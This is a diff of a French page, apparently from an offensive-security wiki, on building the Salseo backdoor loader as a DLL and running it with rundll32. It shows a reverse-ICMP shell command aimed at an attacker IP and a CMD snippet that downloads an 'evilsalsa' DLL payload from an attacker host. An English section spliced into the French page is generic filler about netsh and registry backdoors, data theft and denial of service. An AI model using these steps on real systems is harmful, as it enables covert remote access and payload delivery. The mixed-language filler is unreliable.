@@ -99,23 +99,23 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
-### Ajoutez avant la fonction principale : \[DllExport]
+### Ajoutez avant la fonction principale: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
 #### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
+#### **Recherchez le package DllExport (utilisez l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
 Dans le dossier de votre projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**
 
-### **Désinstallez DllExport**
+### **Désinstallez** DllExport
 
 Appuyez sur **Désinstaller** (oui, c'est bizarre mais faites-moi confiance, c'est nécessaire)
 
@@ -143,7 +143,7 @@ Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Proprié
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Sélectionnez **Plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
+Sélectionnez la **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -174,13 +174,21 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and performing various tasks. CMD can be used to navigate the file system, run programs, manage processes, and perform administrative tasks.
+CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.
 
-To access CMD, simply open the Command Prompt application on a Windows machine. Once opened, you can start executing commands by typing them directly into the CMD window.
+To exploit CMD, hackers often use backdoors to gain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can maintain access even if the system is patched or the user's password is changed.
 
-It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical. Always ensure that you have proper authorization before using CMD on a target system.
+There are several ways to create a backdoor in CMD. One common method is to use the "netsh" command to create a persistent backdoor. The "netsh" command is a powerful tool that allows users to configure network settings. By using the "netsh" command, hackers can create a backdoor that listens for incoming connections and provides them with remote access to the compromised system.
+
+Another method is to use the "reg" command to create a backdoor in the Windows Registry. The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system. By modifying the Registry, hackers can create a backdoor that is executed every time the system starts up, providing them with persistent access to the compromised system.
+
+In addition to creating backdoors, hackers can also use CMD to perform other malicious activities. For example, they can use CMD to execute malware, steal sensitive information, or launch denial-of-service attacks.
+
+To protect against CMD-based attacks, it is important to implement strong security measures, such as regularly updating the operating system, using strong passwords, and monitoring system logs for suspicious activities. Additionally, it is recommended to use antivirus software and firewall to detect and block malicious CMD commands and scripts.
+
+By understanding how CMD works and the various techniques used by hackers, you can better protect your systems and networks from unauthorized access and malicious activities.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
